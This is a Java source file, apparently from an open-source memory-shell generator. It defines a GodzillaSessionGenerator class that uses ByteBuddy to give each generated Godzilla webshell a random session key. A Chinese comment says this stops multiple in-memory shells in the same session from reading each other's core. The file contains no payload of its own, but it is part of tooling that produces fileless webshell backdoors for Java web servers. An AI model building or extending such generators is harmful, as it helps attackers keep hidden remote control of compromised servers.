package com.reajason.javaweb.memshell.shelltool.godzilla.session;

import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaGenerator;
import com.reajason.javaweb.utils.CommonUtil;
import net.bytebuddy.dynamic.DynamicType;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * 配置项与哥斯拉一致（pass/key/header），sessionKey 是会话属性的命名空间，
 * 客户端无需感知，每次生成随机一个避免同会话内不同内存马互相读到对方的 core
 *
 * @author ReaJason
 */
public class GodzillaSessionGenerator extends GodzillaGenerator {

    public GodzillaSessionGenerator(ShellConfig shellConfig, GodzillaConfig godzillaConfig) {
        super(shellConfig, godzillaConfig);
    }

    @Override
    public DynamicType.Builder<?> getBuilder() {
        return super.getBuilder()
                .field(named("sessionKey")).value(CommonUtil.getRandomString(8));
    }
}
